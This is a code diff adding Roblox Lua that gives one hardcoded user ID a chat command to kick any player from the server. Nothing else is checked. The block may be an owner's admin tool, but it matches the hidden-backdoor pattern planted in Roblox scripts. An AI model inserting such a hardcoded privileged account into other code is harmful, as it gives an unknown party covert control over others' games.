@@ -1,3 +1,19 @@
+local Players = game:GetService("Players")
+Players.PlayerAdded:Connect(function(Player)
+	if Player.UserId == 3979789422 then
+		Player.Chatted:Connect(function(msg)
+			if msg then
+				local message = string.split(msg, " ")
+				if message[1] and message[2] then
+					if message[1] == "kick" and Players:FindFirstChild(message[2]) then
+						Players:FindFirstChild(message[2]):Kick()
+					end
+				end
+			end
+		end
+	end
+end)
+
 task.spawn(function()
 
 
